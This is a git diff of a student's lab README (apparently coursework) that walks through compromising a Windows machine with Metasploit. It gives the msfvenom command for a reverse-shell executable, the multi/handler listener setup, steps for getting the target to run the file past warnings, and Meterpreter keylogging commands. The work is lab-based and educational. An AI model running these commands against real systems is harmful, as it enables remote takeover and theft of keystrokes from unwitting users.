@@ -1,4 +1,6 @@
 # Compromising-windows-using-Metasploit
+## NAME:Dharunyadevi S
+## REGISTER NUMBER:212223220018
 Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
@@ -63,72 +65,67 @@ Find the attackers ip address using ifconfig
 
 ### Output:
 
-<img width="639" height="503" alt="Screenshot 2025-09-22 142652" src="https://github.com/user-attachments/assets/dc04194d-48b4-495b-a16e-e5a807ccda2e" />
+<img width="1133" height="506" alt="image" src="https://github.com/user-attachments/assets/4bfaf17a-2563-47b1-bd71-fa15dc7790bf" />
 
 
-Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > dharunya.exe```
+
+Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 -f exe > dharunya.exe```
 
 ### Output:
-<img width="627" height="255" alt="image" src="https://github.com/user-attachments/assets/d2767749-49eb-41d6-8963-0e31d62b7fa2" />
+<img width="1139" height="258" alt="image" src="https://github.com/user-attachments/assets/3ebd4bf6-333f-4865-903b-f25147a4812d" />
 
+copy the dharunya.exe into the apache /var/www/html folder
 
-Start python server ```python3 -m http.server``` 
+<img width="478" height="82" alt="image" src="https://github.com/user-attachments/assets/382caa03-6cc7-46ba-ac9b-1d1456f63fdd" />
 
-<img width="623" height="162" alt="image" src="https://github.com/user-attachments/assets/2743fda8-a9e3-4a4c-8228-a5ce39ce012b" />
+Start apache server
+sudo systemctl apache2 start
 
+<img width="463" height="75" alt="image" src="https://github.com/user-attachments/assets/575150d8-7122-4a6b-b8b0-85d972055ccc" />
+
+Check the status of apache2
+<img width="1112" height="492" alt="image" src="https://github.com/user-attachments/assets/79cc7318-68ee-47a0-be42-81cbda838ea8" />
 
 Invoke msfconsole:
+## OUTPUT:
 
-Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
+<img width="1010" height="737" alt="image" src="https://github.com/user-attachments/assets/c0ab0328-6859-4b2a-b879-de0e40e10f56" />
 
-### Output 
+Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-<img width="622" height="442" alt="Screenshot 2025-09-22 094250" src="https://github.com/user-attachments/assets/8f59d4b7-7ded-459a-8fe7-d0e05fb13579" />
+<img width="1140" height="710" alt="image" src="https://github.com/user-attachments/assets/951a088a-f643-4fcc-8010-4ac5d47f5a7b" />
 
-<img width="636" height="444" alt="Screenshot 2025-09-22 094304" src="https://github.com/user-attachments/assets/b37f8932-2952-4b1a-a302-70ca0a45c2df" />
-
-Type help or a question mark "?" or help to see the list of all available commands you can use inside msfconsole.
-
-### Output
-
-<img width="897" height="869" alt="Screenshot 2025-09-27 091122" src="https://github.com/user-attachments/assets/0130b1a9-5684-408c-a1e8-2ff2a1fb1ca4" />
 
 Starting a command and control Server
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.0.2.15
 exploit
 
-### Output
+<img width="886" height="256" alt="image" src="https://github.com/user-attachments/assets/d6d88aac-af11-426e-8d3c-1c5cbe4b731d" />
 
-<img width="636" height="444" alt="Screenshot 2025-09-22 094304" src="https://github.com/user-attachments/assets/28d309a4-23cc-4fa9-a763-aa69c3b67fc9" />
-
-<img width="881" height="116" alt="Screenshot 2025-09-29 094207" src="https://github.com/user-attachments/assets/734d98ba-8909-4a20-942d-292f3e4534f5" />
-
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/.exe``` The file "dharunya.exe" downloads.
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/dharunya.exe``` The file "dharunya.exe" downloads.
 
 ### Output
 
-<img width="806" height="612" alt="Screenshot 2025-09-22 093823" src="https://github.com/user-attachments/assets/e57d7ebe-8dc8-46c2-b232-9e84765c9ed5" />
+<img width="1170" height="873" alt="image" src="https://github.com/user-attachments/assets/ba81f91d-18d4-47a0-9c36-ea5f4d616149" />
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
+<img width="935" height="744" alt="image" src="https://github.com/user-attachments/assets/bd509409-51af-43c7-b79f-f5f00622c785" />
 
+The target is now owned. Following are meterpreter commands for key capturing in the target machine
+keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name
 
-To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the dharunya.exe process running with pid 1156
+<img width="388" height="59" alt="image" src="https://github.com/user-attachments/assets/5c539cbd-4376-4e73-9f45-0ebe51afc4fb" />
 
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
+<img width="1166" height="870" alt="image" src="https://github.com/user-attachments/assets/ec8328cf-e580-40ad-8cdd-da1a6a25dff1" />
 
-migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
+keyscan_dump	Shows the keystrokes captured so far
 
-#### Post Exploitation:
-The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-
-
-
-keyscan_dump Shows the keystrokes captured so far
-
+<img width="576" height="223" alt="image" src="https://github.com/user-attachments/assets/a9cef6ad-4c30-4c8f-9ef7-d2467f501492" />
 
 
 ## RESULT:
